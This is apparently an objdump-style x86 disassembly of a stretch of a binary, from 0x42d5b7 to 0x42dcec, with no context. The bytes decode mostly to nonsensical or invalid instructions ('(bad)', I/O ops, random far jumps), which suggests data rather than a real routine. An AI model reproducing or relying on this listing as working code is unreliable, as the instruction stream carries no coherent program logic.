  42d5b7:	sbb    BYTE PTR [edx+0x12],0x3
  42d5bb:	iret   
  42d5bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d5bd:	sbb    cl,al
  42d5bf:	inc    ebx
  42d5c0:	nop
  42d5c1:	aaa    
  42d5c2:	adc    DWORD PTR [edi+0x7],0x2fbd6066
  42d5c9:	xor    al,0xf9
  42d5cb:	add    edx,DWORD PTR [eax+0x5f57b636]
  42d5d1:	pushf  
  42d5d2:	cmc    
  42d5d3:	xor    al,0x17
  42d5d5:	add    DWORD PTR [esi+0x6b],edi
  42d5d8:	pop    es
  42d5d9:	adc    dh,dh
  42d5db:	xchg   DWORD PTR [edi],edi
  42d5dd:	xchg   DWORD PTR [esi],ecx
  42d5df:	(bad)  
  42d5e0:	mov    BYTE PTR [ebp-0x44952ace],0x3f
  42d5e7:	ror    DWORD PTR [edi-0x7e2cf168],cl
  42d5ed:	sbb    cl,BYTE PTR [edi]
  42d5ef:	cmp    al,dh
  42d5f1:	or     al,0xac
  42d5f3:	imul   ecx,DWORD PTR [esi+0x13800ec0],0x17e9251c
  42d5fd:	push   edx
  42d5fe:	sbb    al,0xac
  42d600:	les    edi,FWORD PTR [eax]
  42d602:	fadd   DWORD PTR [ecx-0x2f]
  42d605:	adc    eax,0x65c426ec
  42d60a:	jmp    0x42d62a
  42d60c:	into   
  42d60d:	dec    esp
  42d60e:	(bad)  
  42d60f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d610:	add    BYTE PTR [eax],al
  42d612:	add    BYTE PTR [eax],al
  42d614:	add    BYTE PTR [ecx-0x420306ef],ah
  42d61a:	ins    BYTE PTR es:[edi],dx
  42d61b:	dec    ecx
  42d61c:	mov    ds:0x2a4a170a,al
  42d621:	cli    
  42d622:	jge    0x42d656
  42d624:	in     eax,dx
  42d625:	pop    ebx
  42d626:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d627:	jmp    0x42d617
  42d629:	pop    ebp
  42d62a:	loopne 0x42d5fa
  42d62c:	stos   DWORD PTR es:[edi],eax
  42d62d:	cwde   
  42d62e:	mov    dl,0x3f
  42d630:	aaa    
  42d631:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d632:	cmp    esi,esp
  42d634:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  42d636:	mov    dh,0x3f
  42d638:	into   
  42d639:	inc    edi
  42d63a:	and    DWORD PTR [ecx],eax
  42d63c:	sub    DWORD PTR [edi+edi*1-0x4446fa9c],ecx
  42d643:	imul   BYTE PTR [esi+0x28]
  42d646:	or     al,0xec
  42d648:	bound  ebp,QWORD PTR [ebp-0x22]
  42d64b:	mul    BYTE PTR [esi]
  42d64d:	cmp    BYTE PTR [esp+ebp*8],cl
  42d650:	adc    esp,DWORD PTR [ecx+ebp*2]
  42d653:	aam    0xef
  42d655:	xchg   ebx,eax
  42d656:	je     0x42d6ae
  42d658:	adc    al,0xdb
  42d65a:	cmp    eax,0x89ed0064
  42d65f:	adc    eax,0xe91aa2e8
  42d664:	call   DWORD PTR [ebx-0x839bbf2]
  42d66a:	mov    ah,0x50
  42d66c:	dec    eax
  42d66d:	(bad)  
  42d66e:	sti    
  42d66f:	pop    esp
  42d670:	jmp    esp
  42d672:	in     al,dx
  42d673:	sbb    DWORD PTR [eax-0x17],eax
  42d676:	fisttp QWORD PTR [eax+0x5b]
  42d679:	add    BYTE PTR [eax],al
  42d67b:	add    BYTE PTR [eax],al
  42d67d:	add    BYTE PTR [edx+0x35],bh
  42d680:	clc    
  42d681:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d682:	mov    eax,0x24530eb4
  42d687:	(bad)  
  42d688:	xchg   ebx,eax
  42d689:	icebp  
  42d68a:	push   ss
  42d68b:	mov    cl,BYTE PTR ds:0xb38b8232
  42d691:	pushf  
  42d692:	mov    eax,0xf58d0eb4
  42d697:	fdiv   DWORD PTR [edx]
  42d699:	push   eax
  42d69a:	xor    dl,BYTE PTR [eax-0xc]
  42d69d:	ds pushf 
  42d69f:	std    
  42d6a0:	call   0x7aad9029
  42d6a5:	lea    esp,ds:0x2d8d72d8
  42d6ab:	fdiv   DWORD PTR [esi]
  42d6ad:	call   0x2ef659
  42d6b2:	ret    
  42d6b3:	mov    bl,0x92
  42d6b5:	rol    ah,0x10
  42d6b8:	fwait
  42d6b9:	inc    esp
  42d6ba:	test   DWORD PTR [esi-0x13d074c2],ebp
  42d6c0:	mov    ch,0xfd
  42d6c2:	dec    esi
  42d6c3:	push   esp
  42d6c5:	inc    esp
  42d6c6:	(bad)  
  42d6c7:	xor    ch,BYTE PTR [si]
  42d6ca:	lods   al,BYTE PTR ds:[esi]
  42d6cb:	iret   
  42d6cc:	xor    bl,BYTE PTR [eax]
  42d6ce:	push   ecx
  42d6cf:	stos   BYTE PTR es:[edi],al
  42d6d0:	(bad)  
  42d6d1:	(bad)  
  42d6d2:	cmp    ecx,ecx
  42d6d4:	jbe    0x42d6e6
  42d6d6:	push   esi
  42d6d7:	mov    ah,0xe
  42d6d9:	lea    edx,[eax+0x606c36dd]
  42d6df:	outs   dx,BYTE PTR ds:[esi]
  42d6e0:	sub    esp,DWORD PTR [eax+eax*1]
  42d6e3:	add    BYTE PTR [eax],al
  42d6e5:	add    BYTE PTR [eax],al
  42d6e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d6e8:	and    DWORD PTR [ebx],edx
  42d6ea:	adc    al,0x90
  42d6ec:	sbb    DWORD PTR [edi+edi*4+0x1464e7d],edx
  42d6f3:	sbb    eax,0x402836d6
  42d6f8:	test   BYTE PTR [ecx-0x2591a619],ch
  42d6fe:	cli    
  42d6ff:	add    eax,0xd7103456
  42d704:	push   ebp
  42d705:	xor    al,0x10
  42d707:	cmp    al,0x3c
  42d709:	push   eax
  42d70a:	add    BYTE PTR [eax-0x48002217],ch
  42d710:	(bad)  
  42d711:	into   
  42d712:	jg     0x42d6bf
  42d714:	sbb    al,0x3e
  42d716:	test   BYTE PTR [edx-0x27],ah
  42d719:	cmp    bl,BYTE PTR [edx+0x3d]
  42d71c:	hlt    
  42d71d:	nop
  42d71e:	ret    
  42d71f:	in     al,dx
  42d720:	sbb    dl,BYTE PTR [eax]
  42d722:	add    BYTE PTR [edx+0x11],dl
  42d725:	adc    BYTE PTR [edi+0x9bfd44],al
  42d72b:	nop
  42d72c:	sbb    DWORD PTR [ebp+0x24e3fdfa],edx
  42d732:	push   ecx
  42d733:	sbb    eax,0x7818342d
  42d738:	mov    bl,0xe4
  42d73a:	call   FWORD PTR [edi-0x7d]
  42d73d:	mov    edx,0x6c183b83
  42d742:	mov    cl,0x90
  42d744:	sbb    DWORD PTR [eax],edx
  42d746:	jmp    0x52f03e
  42d74b:	add    BYTE PTR [eax],al
  42d74d:	add    BYTE PTR [eax],al
  42d74f:	add    BYTE PTR [edx-0x20aedce6],ch
  42d755:	jae    0x42d769
  42d757:	lea    ebx,[esi*4-0x4dd80032]
  42d75e:	cmc    
  42d75f:	fist   DWORD PTR [esi]
  42d761:	and    eax,0x6dadcb8c
  42d766:	jb     0x42d798
  42d768:	mov    ah,0x72
  42d76a:	push   ds
  42d76b:	fmul   st(6),st
  42d76d:	mov    edi,0x760d03f5
  42d772:	rol    DWORD PTR [edi],1
  42d774:	or     DWORD PTR [esi],esi
  42d776:	fcmovb st,st(3)
  42d778:	out    dx,eax
  42d779:	push   cs
  42d77a:	idiv   BYTE PTR [eax+0x53]
  42d77d:	(bad)  
  42d77e:	popf   
  42d77f:	xor    edx,DWORD PTR [edi]
  42d781:	(bad)  
  42d782:	cmp    eax,0xf5b28727
  42d787:	jg     0x42d798
  42d789:	xchg   BYTE PTR [edi+0x197602fa],dh
  42d78f:	cmp    al,0x48
  42d791:	jp     0x42d734
  42d793:	add    BYTE PTR [edi],dh
  42d795:	sbb    cl,bl
  42d797:	push   eax
  42d798:	xchg   ebx,eax
  42d799:	ret    
  42d79a:	xor    eax,0xd9761962
  42d79f:	cmp    eax,0x83d2260d
  42d7a4:	xchg   edi,eax
  42d7a5:	push   cs
  42d7a6:	idiv   BYTE PTR [eax-0x25]
  42d7a9:	(bad)  
  42d7aa:	lods   eax,DWORD PTR ds:[esi]
  42d7ab:	fstp   TBYTE PTR [ebx]
  42d7ad:	stos   BYTE PTR es:[edi],al
  42d7ae:	cmc    
  42d7af:	add    edx,DWORD PTR [ebx+esi*8]
  42d7b2:	popa   
  42d7b3:	in     al,dx
  42d7b4:	add    BYTE PTR [eax],al
  42d7b6:	add    BYTE PTR [eax],al
  42d7b8:	add    BYTE PTR [edi+esi*1],al
  42d7bb:	fiadd  DWORD PTR [ebx+0x33f60e6f]
  42d7c1:	adc    eax,0xc0441977
  42d7c6:	aas    
  42d7c7:	jp     0x42d7e8
  42d7c9:	sbb    BYTE PTR [ebx-0x19c7fc0b],dh
  42d7cf:	(bad)  
  42d7d0:	leave  
  42d7d1:	dec    edx
  42d7d2:	inc    eax
  42d7d3:	jp     0x42d7f4
  42d7d5:	add    BYTE PTR [ebx+0x67e003f5],dh
  42d7db:	push   cs
  42d7dc:	inc    ecx
  42d7dd:	test   BYTE PTR [edi-0x1f5916f2],al
  42d7e3:	cdq    
  42d7e4:	xor    eax,0xe4f6ae70
  42d7e9:	sub    BYTE PTR [esi],cl
  42d7eb:	in     al,dx
  42d7ec:	fs xchg ecx,edx
  42d7ef:	sahf   
  42d7f0:	jmp    0xa1db8a88
  42d7f5:	(bad)  [ecx]
  42d7f7:	cmp    BYTE PTR [edi-0x36],0x97
  42d7fb:	push   cs
  42d7fc:	fs scas eax,DWORD PTR es:[edi]
  42d7fe:	(bad)  
  42d7ff:	sbb    DWORD PTR ss:[edi-0x5],esp
  42d803:	mul    ch
  42d805:	xlat   BYTE PTR ds:[ebx]
  42d806:	or     ah,ch
  42d808:	ins    BYTE PTR es:[edi],dx
  42d809:	lahf   
  42d80a:	(bad)  
  42d80b:	(bad)  
  42d80c:	sub    eax,0xd4fed68f
  42d811:	out    dx,al
  42d812:	int    0xe
  42d814:	push   ecx
  42d815:	(bad)  
  42d816:	mov    ds:0x4c35e90e,al
  42d81b:	imul   ah
  42d81d:	add    BYTE PTR [eax],al
  42d81f:	add    BYTE PTR [eax],al
  42d821:	add    dl,bl
  42d823:	or     ah,ch
  42d825:	push   0xe91249bf
  42d82a:	xchg   ebx,eax
  42d82b:	jge    0x42d86e
  42d82d:	mov    bh,0x62
  42d82f:	xor    eax,0x118016f6
  42d834:	add    DWORD PTR [ecx-0x3264ca6d],ebp
  42d83a:	das    
  42d83b:	mov    dh,0xe
  42d83d:	jmp    0xdd754a36
  42d842:	out    dx,al
  42d843:	jbe    0x42d853
  42d845:	out    dx,al
  42d846:	add    ch,BYTE PTR [ecx]
  42d848:	push   cs
  42d849:	jmp    0x59617e1
  42d84e:	fs xchg ebp,eax
  42d850:	push   ds
  42d851:	pop    esp
  42d852:	xchg   esp,eax
  42d853:	mov    dl,0x78
  42d855:	in     eax,0x83
  42d857:	sbb    dl,BYTE PTR [edi+0x0]
  42d85a:	pop    edi
  42d85b:	mov    cl,0xe
  42d85d:	test   cl,ch
  42d85f:	jl     0x42d870
  42d861:	xor    bh,cl
  42d863:	call   0xb17bd952
  42d868:	xchg   ebx,eax
  42d869:	inc    ebp
  42d86a:	sub    DWORD PTR [edi+edx*2-0x183e6edc],eax
  42d871:	mov    ah,0xdd
  42d873:	pop    eax
  42d874:	adc    eax,DWORD PTR [eax]
  42d876:	stc    
  42d877:	lea    edx,[ebx+0xeb0e880]
  42d87d:	add    DWORD PTR [edx-0x5],0xfffffff3
  42d881:	lds    esi,FWORD PTR [edx-0x4a]
  42d884:	push   cs
  42d885:	test   BYTE PTR [eax],al
  42d887:	add    BYTE PTR [eax],al
  42d889:	add    BYTE PTR [eax],al
  42d88b:	cmp    DWORD PTR [edx-0x3a],esp
  42d88e:	mov    esi,ebp
  42d890:	lods   al,BYTE PTR ds:[esi]
  42d891:	or     cl,BYTE PTR [ebx-0x74f95343]
  42d897:	mov    cs,WORD PTR [edi+0x6fb2e8d5]
  42d89d:	push   cs
  42d89e:	add    BYTE PTR [eax+0x72],al
  42d8a1:	xor    bl,BYTE PTR [eax]
  42d8a3:	sub    al,0xf6
  42d8a5:	sbb    BYTE PTR [esi+0xeb643],cl
  42d8ab:	inc    esp
  42d8ac:	retf   0x2032
  42d8af:	cmp    esi,0xada90028
  42d8b5:	push   0x24
  42d8b7:	sub    DWORD PTR [esi+0xd],0xb4d2ed8d
  42d8be:	add    BYTE PTR [ecx-0x50],ch
  42d8c1:	mov    ebx,DWORD PTR ds:[esi-0x7d172a73]
  42d8c8:	test   al,0xe
  42d8ca:	add    dl,dh
  42d8cc:	(bad)  
  42d8cd:	xchg   edx,eax
  42d8ce:	(bad)  
  42d8cf:	mov    ebp,0x7a079362
  42d8d4:	loopne 0x42d86a
  42d8d6:	inc    eax
  42d8d7:	nop
  42d8d8:	add    eax,0x56c441b
  42d8dd:	pop    ebp
  42d8de:	pop    ecx
  42d8df:	out    0x61,al
  42d8e1:	stos   BYTE PTR es:[edi],al
  42d8e2:	push   DWORD PTR [edi]
  42d8e4:	sbb    ch,BYTE PTR [ebx-0x36]
  42d8e7:	cmp    BYTE PTR [edi+0x9],bh
  42d8ea:	add    BYTE PTR [eax+0x73cf96],dl
  42d8f0:	add    BYTE PTR [eax],al
  42d8f2:	add    BYTE PTR [eax],al
  42d8f4:	xchg   ebp,eax
  42d8f5:	adc    al,BYTE PTR [eax+0xc]
  42d8f8:	popf   
  42d8f9:	or     BYTE PTR [esi],bl
  42d8fb:	data16 je 0x42d88e
  42d8fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d8ff:	out    0x62,eax
  42d901:	lock lldt WORD PTR ds:0xb9115c5a
  42d909:	or     esp,esp
  42d90b:	jae    0x42d8a9
  42d90d:	lods   al,BYTE PTR ds:[esi]
  42d90e:	imul   ecx,esp,0xfad8ebf8
  42d914:	fild   WORD PTR [eax-0x7f531949]
  42d91a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d91b:	out    0x88,eax
  42d91d:	data16 (bad) 
  42d91f:	cli    
  42d920:	pop    esi
  42d921:	test   al,0xa4
  42d923:	mov    eax,0x101a19
  42d928:	test   al,0xf3
  42d92a:	(bad)  
  42d92b:	cli    
  42d92c:	scas   eax,DWORD PTR es:[edi]
  42d92d:	sub    eax,DWORD PTR [ebx]
  42d92f:	into   
  42d930:	jmp    0x9042e896
  42d935:	mov    eax,ds:0xac97ed38
  42d93a:	add    dl,bh
  42d93c:	rcl    DWORD PTR [eax-0x45c3181a],cl
  42d942:	(bad)  
  42d943:	cli    
  42d944:	or     eax,esp
  42d946:	(bad)  
  42d947:	lods   al,BYTE PTR ds:[esi]
  42d948:	jno    0x42d956
  42d94a:	aam    0x86
  42d94c:	pop    esi
  42d94d:	mov    cl,0xad
  42d94f:	loopne 0x42d9b8
  42d951:	sbb    al,0x68
  42d953:	dec    esp
  42d954:	nop
  42d955:	mov    dl,0x28
  42d957:	mov    DWORD PTR [eax],0x0
  42d95d:	and    edx,esi
  42d95f:	int    0x1
  42d961:	nop
  42d962:	mov    dl,0x70
  42d964:	jge    0x42d92d
  42d966:	mov    cl,0xf5
  42d968:	add    ebp,DWORD PTR [eax]
  42d96a:	imul   esp,DWORD PTR [eax+0x4],0x83b5bf90
  42d971:	es mov cl,0xf4
  42d974:	outs   dx,DWORD PTR ds:[esi]
  42d975:	out    0x6a,eax
  42d977:	sbb    ebp,DWORD PTR [ecx]
  42d979:	(bad)  
  42d97a:	xor    DWORD PTR [edx-0xa4d7378],edi
  42d980:	rcl    DWORD PTR [edi+0x5d3326b2],0x37
  42d987:	lahf   
  42d988:	pop    edx
  42d989:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d98a:	cmp    DWORD PTR [edx],esi
  42d98c:	and    BYTE PTR [edx+ebx*1-0x4d6fde4b],al
  42d993:	jo     0x42d9ed
  42d995:	lods   al,BYTE PTR ds:[esi]
  42d996:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d997:	add    eax,0xa5b65479
  42d99c:	(bad)  
  42d99d:	jl     0x42d935
  42d99f:	jecxz  0x42d9e4
  42d9a1:	nop
  42d9a2:	das    
  42d9a3:	cmp    bh,al
  42d9a5:	or     al,0xf2
  42d9a7:	sar    esi,0x6d
  42d9aa:	repnz ds mov dh,0xb7
  42d9ae:	or     dh,dh
  42d9b0:	mul    dl
  42d9b2:	jl     0x42d975
  42d9b4:	sub    eax,0x5e3cbf43
  42d9b9:	adc    eax,0xf6289f9
  42d9be:	scas   eax,DWORD PTR es:[edi]
  42d9bf:	xchg   ebx,eax
  42d9c0:	or     al,0x0
  42d9c2:	add    BYTE PTR [eax],al
  42d9c4:	add    BYTE PTR [eax],al
  42d9c6:	sbb    BYTE PTR [edi+0x7f9003f6],ah
  42d9cc:	popf   
  42d9cd:	xchg   esp,eax
  42d9ce:	nop
  42d9cf:	sbb    al,BYTE PTR [edi]
  42d9d1:	out    dx,eax
  42d9d2:	ja     0x42d9de
  42d9d4:	popa   
  42d9d5:	aam    0x14
  42d9d7:	add    DWORD PTR [edi],ecx
  42d9d9:	jge    0x42d985
  42d9db:	xor    esp,edx
  42d9dd:	pusha  
  42d9de:	ror    dh,1
  42d9e0:	push   es
  42d9e1:	and    BYTE PTR [esi+0x756c288c],cl
  42d9e7:	scas   al,BYTE PTR es:[edi]
  42d9e8:	(bad)  
  42d9e9:	push   edx
  42d9ea:	nop
  42d9eb:	mov    ds:0xb0bb0861,al
  42d9f0:	xchg   ecx,eax
  42d9f1:	mov    al,0xc7
  42d9f3:	mov    eax,ds:0x90902899
  42d9f8:	adc    bl,BYTE PTR [ecx]
  42d9fa:	test   eax,0x5719066e
  42d9ff:	lahf   
  42da00:	jb     0x42da01
  42da02:	shl    DWORD PTR [edx+0x2f07a58f],cl
  42da08:	iret   
  42da09:	sbb    eax,0xc553314f
  42da0e:	jmp    0x42d9d9
  42da10:	(bad)  
  42da14:	push   ebx
  42da15:	(bad)  
  42da18:	adc    al,0xf5
  42da1a:	sub    BYTE PTR [ecx],dh
  42da1c:	dec    ebx
  42da1d:	(bad)
  42da20:	fst    QWORD PTR [ecx+0x2d]
  42da23:	jmp    0x75a:0x44c65eeb
  42da2a:	add    BYTE PTR [eax],al
  42da2c:	add    BYTE PTR [eax],al
  42da2e:	add    BYTE PTR [esi+0x2f],ah
  42da31:	(bad)  
  42da32:	aad    0x84
  42da34:	xor    DWORD PTR [eax],edx
  42da36:	iret   
  42da37:	test   BYTE PTR [edx],bh
  42da39:	or     eax,0x61b293e8
  42da3e:	scas   eax,DWORD PTR es:[edi]
  42da3f:	cld    
  42da40:	pop    es
  42da41:	hlt    
  42da42:	les    ebp,FWORD PTR [esi-0x3c8d13f7]
  42da48:	cs in  eax,0x95
  42da4b:	pushf  
  42da4c:	retf   
  42da4d:	sub    al,0x97
  42da4f:	popf   
  42da50:	aaa    
  42da51:	dec    ebp
  42da52:	in     eax,0x12
  42da54:	adc    BYTE PTR [edx],0x0
  42da57:	ins    DWORD PTR es:[edi],dx
  42da58:	bound  ecx,QWORD PTR [ecx]
  42da5a:	mov    edi,DWORD PTR [edx+0x32]
  42da5d:	lods   al,BYTE PTR ds:[esi]
  42da5e:	je     0x42daa6
  42da60:	xor    al,0xac
  42da62:	or     BYTE PTR [ebx],dl
  42da64:	add    eax,0x10a48d5c
  42da69:	pop    esp
  42da6a:	inc    DWORD PTR [ecx+ebp*2+0x0]
  42da6e:	inc    eax
  42da6f:	cmp    DWORD PTR [edx],esi
  42da71:	ror    BYTE PTR [esp+esi*4],1
  42da74:	out    dx,al
  42da75:	pop    edi
  42da76:	sbb    DWORD PTR [esi+0x33],esp
  42da79:	lods   eax,DWORD PTR ds:[esi]
  42da7a:	or     BYTE PTR [edx-0x4d2a9550],dl
  42da80:	inc    eax
  42da81:	hlt    
  42da82:	test   BYTE PTR [ecx-0x11],cl
  42da85:	call   0x4911c3bc
  42da8a:	pop    ebp
  42da8b:	push   edx
  42da8c:	(bad)  [esp+eax*1-0x172a7607]
  42da93:	add    BYTE PTR [eax],al
  42da95:	add    BYTE PTR [eax],al
  42da97:	add    BYTE PTR [edx-0x460016f2],bl
  42da9d:	mov    ch,0xf3
  42da9f:	in     eax,dx
  42daa0:	jp     0x42da8c
  42daa2:	daa    
  42daa3:	push   ebp
  42daa4:	xchg   edi,edx
  42daa6:	je     0x42dae4
  42daa8:	mov    ecx,ds
  42daaa:	cdq    
  42daab:	inc    esp
  42daac:	test   esi,edi
  42daae:	jno    0x42dab0
  42dab0:	or     DWORD PTR [edx-0x1097741f],ecx
  42dab6:	add    ah,BYTE PTR [eax-0x39]
  42dab9:	je     0x42dac9
  42dabb:	xor    ebp,DWORD PTR [ecx+0x6e]
  42dabe:	imul   eax,esp,0xffffffbd
  42dac1:	mov    ecx,DWORD PTR [edi+0x24]
  42dac4:	cdq    
  42dac5:	lea    ecx,[edi+0x24]
  42dac8:	lods   eax,DWORD PTR ds:[esi]
  42dac9:	mov    ecx,DWORD PTR [edi+0x24]
  42dacc:	in     eax,0x7f
  42dace:	dec    edi
  42dacf:	and    al,0x7d
  42dad1:	les    edx,FWORD PTR [ebp-0x200a6f94]
  42dad7:	cs ins DWORD PTR es:[edi],dx
  42dad9:	aas    
  42dada:	cmp    eax,0xabe77752
  42dadf:	adc    al,0xd0
  42dae1:	sbb    DWORD PTR [ebp-0x41],ebp
  42dae4:	fstp   QWORD PTR [eax]
  42dae6:	(bad)  
  42dae7:	mov    edi,0x12cf69
  42daec:	nop
  42daed:	arpl   dx,sp
  42daef:	push   esp
  42daf0:	out    0xe8,eax
  42daf2:	cld    
  42daf3:	pop    edi
  42daf4:	sahf   
  42daf5:	fst    DWORD PTR [edx]
  42daf7:	xchg   esp,esp
  42daf9:	lods   eax,DWORD PTR ds:[esi]
  42dafa:	push   es
  42dafb:	xchg   DWORD PTR [eax],eax
  42dafd:	add    BYTE PTR [eax],al
  42daff:	add    BYTE PTR [eax],al
  42db01:	les    esi,FWORD PTR [ebp+0x16547f0a]
  42db07:	enter  0x8da3,0x3f
  42db0b:	ror    DWORD PTR [eax+0x73cf8e97],cl
  42db11:	cmp    DWORD PTR [ebp-0x7b33dbdd],eax
  42db17:	cmp    esp,DWORD PTR [eax+ecx*8]
  42db1a:	xchg   esi,eax
  42db1b:	test   al,0x73
  42db1d:	mov    eax,ds:0x7d2b1599
  42db22:	std    
  42db23:	sub    BYTE PTR [esi],bh
  42db25:	sbb    esi,edx
  42db27:	cs cmp al,0x19
  42db2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42db2b:	cs cmp bl,ch
  42db2e:	xor    al,0x67
  42db30:	jae    0x42dade
  42db32:	push   ebp
  42db33:	psllw  mm3,QWORD PTR ds:0xd0850e50
  42db3a:	in     eax,0xe2
  42db3c:	xchg   al,cl
  42db3e:	jno    0x42dac7
  42db40:	fidiv  DWORD PTR [edi+0x744b6670]
  42db46:	add    eax,0x16c5367
  42db4b:	imul   eax,DWORD PTR [edx-0x6c],0x8974cf8e
  42db52:	mov    dl,0x60
  42db54:	hlt    
  42db55:	ja     0x42db9d
  42db57:	sub    eax,0x661b8ac4
  42db5c:	xor    cl,dh
  42db5e:	jb     0x42db05
  42db60:	fld    TBYTE PTR [ebx-0x19]
  42db63:	adc    al,0xc4
  42db65:	add    BYTE PTR [eax],al
  42db67:	add    BYTE PTR [eax],al
  42db69:	add    BYTE PTR [esi],dl
  42db6b:	outs   dx,BYTE PTR ds:[esi]
  42db6c:	rol    DWORD PTR [edi],1
  42db6e:	imul   edi,DWORD PTR [esi-0x27],0x3f
  42db72:	rol    BYTE PTR [edi],1
  42db74:	bound  ebx,QWORD PTR [edi]
  42db76:	int3   
  42db77:	mov    bl,0x3c
  42db79:	or     al,ah
  42db7b:	sbb    ah,BYTE PTR [ebx+eiz*8+0x4b71074a]
  42db82:	xchg   esp,eax
  42db83:	lock cmc 
  42db85:	repnz push cs
  42db87:	outs   dx,DWORD PTR ds:[esi]
  42db88:	stc    
  42db89:	leave  
  42db8a:	shl    DWORD PTR [eax+0x6e0f03f6],cl
  42db90:	sbb    DWORD PTR [eax],eax
  42db92:	sar    BYTE PTR [ecx],1
  42db94:	xor    eax,0x3a3bb20c
  42db99:	call   0x4ba16c51
  42db9e:	xchg   esp,eax
  42db9f:	cmp    edi,DWORD PTR [edx]
  42dba1:	call   0x7d10f4d
  42dba6:	jl     0x42db5f
  42dba8:	sbb    eax,0x34f09238
  42dbad:	adc    dl,BYTE PTR [eax+0x52c9f01b]
  42dbb3:	mov    eax,0xf093aef7
  42dbb8:	mov    esp,0xf7429111
  42dbbd:	bound  ebp,QWORD PTR [edx+0x65]
  42dbc0:	js     0x42db8a
  42dbc2:	jnp    0x42dbb7
  42dbc4:	mov    ds:0x4232ab8e,al
  42dbc9:	adc    al,0x1d
  42dbcb:	pop    ebp
  42dbcc:	and    eax,0x57
  42dbd1:	add    BYTE PTR [eax],al
  42dbd3:	ja     0x42dbc0
  42dbd5:	push   cs
  42dbd6:	inc    ecx
  42dbd7:	mov    ebx,0x82eec08
  42dbdc:	inc    edi
  42dbdd:	arpl   WORD PTR [ebx+0x72e2771e],dx
  42dbe3:	(bad)  [edx]
  42dbe5:	jns    0x42dbad
  42dbe7:	out    0x3a,al
  42dbe9:	or     esp,ecx
  42dbeb:	push   edx
  42dbec:	jg     0x42dbd0
  42dbee:	push   es
  42dbef:	mov    DWORD PTR [edx+0x0],eax
  42dbf2:	test   eax,0x7dcf2f93
  42dbf7:	aam    0xca
  42dbf9:	inc    esi
  42dbfa:	call   0x6a87a29e
  42dbff:	pop    ebp
  42dc00:	or     DWORD PTR [eax+0x1341fbb1],ebx
  42dc06:	xlat   BYTE PTR ds:[ebx]
  42dc07:	push   edx
  42dc08:	sub    eax,0x81f964df
  42dc0d:	cmp    BYTE PTR [ecx-0x6c],dl
  42dc10:	mov    dl,0xfe
  42dc12:	call   0xb68751d5
  42dc17:	js     0x42dc4b
  42dc19:	add    BYTE PTR [ecx],ch
  42dc1b:	mov    WORD PTR [edi],gs
  42dc1d:	iret   
  42dc1e:	sbb    al,0xa5
  42dc20:	jne    0x42dc9a
  42dc22:	sahf   
  42dc23:	push   ss
  42dc24:	in     al,0xa5
  42dc26:	adc    al,0x5
  42dc29:	in     al,dx
  42dc2a:	sub    DWORD PTR ds:0x1e86ec71,0x3baf97de
  42dc34:	sbb    ecx,ebp
  42dc36:	jbe    0x42dc38
  42dc38:	add    BYTE PTR [eax],al
  42dc3a:	add    BYTE PTR [eax],al
  42dc3c:	shr    BYTE PTR [ebx-0x69],cl
  42dc3f:	sbb    al,0x1c
  42dc41:	push   cs
  42dc42:	out    dx,eax
  42dc43:	inc    edi
  42dc44:	ror    BYTE PTR [eax],cl
  42dc46:	cwde   
  42dc47:	lods   al,BYTE PTR ds:[esi]
  42dc48:	dec    DWORD PTR ds:0x8d237c7
  42dc4e:	cwde   
  42dc4f:	sub    dl,BYTE PTR [esi-0x5]
  42dc52:	iret   
  42dc53:	add    BYTE PTR [edi],cl
  42dc55:	xor    eax,0x68a12460
  42dc5a:	mov    ?,WORD PTR [esi]
  42dc5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dc5d:	xor    al,0xe2
  42dc5f:	jne    0x42dc09
  42dc61:	jnp    0x42dbf1
  42dc63:	ds retfw 0x460d
  42dc68:	ds pop esi
  42dc6a:	inc    eax
  42dc6b:	(bad)  
  42dc6c:	jl     0x42dc97
  42dc6e:	sbb    eax,0xac3a6940
  42dc73:	jne    0x42dccf
  42dc75:	aaa    
  42dc76:	adc    BYTE PTR [esi],bh
  42dc78:	in     eax,dx
  42dc79:	icebp  
  42dc7a:	pop    edi
  42dc7b:	sbb    BYTE PTR ds:0x25146011,ah
  42dc81:	mov    dh,0x7c
  42dc83:	add    al,0x75
  42dc85:	mov    ch,0x60
  42dc87:	or     al,0xa5
  42dc89:	repz pop edi
  42dc8b:	or     BYTE PTR [ebp-0x7afb9d50],ah
  42dc91:	add    esp,DWORD PTR [ebx+0x4]
  42dc94:	test   eax,0x2b02f3b1
  42dc99:	icebp  
  42dc9a:	dec    eax
  42dc9b:	pop    esi
  42dc9c:	jmp    0x42dc57
  42dc9e:	push   cs
  42dc9f:	add    DWORD PTR [eax],0x0
  42dca2:	add    BYTE PTR [eax],al
  42dca4:	add    ch,dl
  42dca6:	popf   
  42dca7:	pop    ebx
  42dca8:	push   ebp
  42dca9:	iret   
  42dcaa:	cmp    DWORD PTR [eax+0x24],eax
  42dcad:	or     DWORD PTR [esi],esi
  42dcaf:	(bad)  
  42dcb0:	mov    esi,DWORD PTR [ebp-0x24a8e3e6]
  42dcb6:	fidivr WORD PTR [ebp*8-0x9c30dd6]
  42dcbd:	popa   
  42dcbe:	push   0x32
  42dcc0:	adc    ch,BYTE PTR [ecx+edi*8+0x18]
  42dcc4:	test   dl,ch
  42dcc6:	scas   eax,DWORD PTR es:[edi]
  42dcc7:	push   cs
  42dcc8:	add    BYTE PTR [edx*2-0x4dc6f3a0],bh
  42dccf:	pop    es
  42dcd0:	ds nop
  42dcd2:	out    0x15,al
  42dcd4:	dec    ebp
  42dcd5:	test   eax,0x90001270
  42dcda:	adc    DWORD PTR [esi],0xff07641b
  42dce0:	test   BYTE PTR [eax+0xb00101a],bl
  42dce6:	into   
  42dce7:	push   ebx
  42dce8:	test   DWORD PTR [eax-0x3],edx
  42dceb:	xchg   esp,eax
  42dcec:	rcl    DWORD PTR [eax-0x1c72efe7],cl
